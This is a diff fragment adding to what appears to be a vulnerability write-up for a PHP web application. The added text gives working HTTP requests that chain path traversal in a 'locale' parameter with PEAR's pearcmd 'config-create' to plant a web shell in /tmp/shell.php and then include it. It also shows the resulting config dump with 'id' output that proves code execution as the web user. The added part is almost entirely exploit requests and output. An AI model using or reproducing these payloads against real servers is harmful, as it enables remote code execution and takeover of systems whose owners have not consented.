@@ -578,5 +578,25 @@ wwwrun   12806  0.0  0.0   5432  1792 ?        S    13:11   0:00 grep mysql/pear
 actually it works by :
 
 ```
+GET /locales/locale.json?+config-create+/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system('id')?>+/tmp/shell.php HTTP/1.1
 
+# this will add the web shell in to /tmp/shell.php
+
+GET /locales/locale.json?locale=../../../../../tmp&namespace=shell HTTP/1.1
+
+#PEAR_Config 0.9
+a:12:{s:7:"php_dir";s:91:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/uid=474(wwwrun) gid=477(www) groups=477(www)
+uid=474(wwwrun) gid=477(www) groups=477(www)/pear/php";s:8:"data_dir";s:92:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/uid=474(wwwrun) gid=477(www) groups=477(www)
+uid=474(wwwrun) gid=477(www) groups=477(www)/pear/data";s:7:"www_dir";s:91:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/uid=474(wwwrun) gid=477(www) groups=477(www)
+uid=474(wwwrun) gid=477(www) groups=477(www)/pear/www";s:7:"cfg_dir";s:91:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/uid=474(wwwrun) gid=477(www) groups=477(www)
+uid=474(wwwrun) gid=477(www) groups=477(www)/pear/cfg";s:7:"ext_dir";s:91:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/uid=474(wwwrun) gid=477(www) groups=477(www)
+uid=474(wwwrun) gid=477(www) groups=477(www)/pear/ext";s:7:"doc_dir";s:92:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/uid=474(wwwrun) gid=477(www) groups=477(www)
+uid=474(wwwrun) gid=477(www) groups=477(www)/pear/docs";s:8:"test_dir";s:93:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/uid=474(wwwrun) gid=477(www) groups=477(www)
+uid=474(wwwrun) gid=477(www) groups=477(www)/pear/tests";s:9:"cache_dir";s:93:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/uid=474(wwwrun) gid=477(www) groups=477(www)
+uid=474(wwwrun) gid=477(www) groups=477(www)/pear/cache";s:12:"download_dir";s:96:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/uid=474(wwwrun) gid=477(www) groups=477(www)
+uid=474(wwwrun) gid=477(www) groups=477(www)/pear/download";s:8:"temp_dir";s:92:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/uid=474(wwwrun) gid=477(www) groups=477(www)
+uid=474(wwwrun) gid=477(www) groups=477(www)/pear/temp";s:7:"bin_dir";s:87:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/uid=474(wwwrun) gid=477(www) groups=477(www)
+uid=474(wwwrun) gid=477(www) groups=477(www)/pear";s:7:"man_dir";s:91:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/uid=474(wwwrun) gid=477(www) groups=477(www)
+uid=474(wwwrun) gid=477(www) groups=477(www)/pear/man";}
 ```
+
